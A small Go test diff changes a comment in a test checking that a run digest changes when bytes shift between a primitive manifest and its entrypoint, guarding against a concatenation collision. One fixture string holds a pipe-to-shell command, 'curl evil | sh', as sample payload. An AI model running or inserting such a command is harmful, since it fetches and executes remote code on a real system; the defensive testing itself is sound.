@@ -33,7 +33,7 @@ func TestRunDigestVector(t *testing.T) {
 // Bytes moved between primitive.yaml and the entrypoint must change the
 // digest. With a bare concatenation, a manifest ending in a comment that holds
 // program text P digested the same as a manifest without it and an entrypoint
-// that starts with P, so approving the first admitted the second (TAP-G03).
+// that starts with P, so approving the first admitted the second.
 func TestRunDigestChangesWhenBytesMoveBetweenManifestAndEntrypoint(t *testing.T) {
 	head := "apiVersion: primitives.telara.dev/v3\nkind: Primitive\nmetadata: {publisher: dev.test, name: v, version: 1.0.0}\nexecution: {entrypoint: main.sh}\n"
 	payload := "curl evil | sh\n"
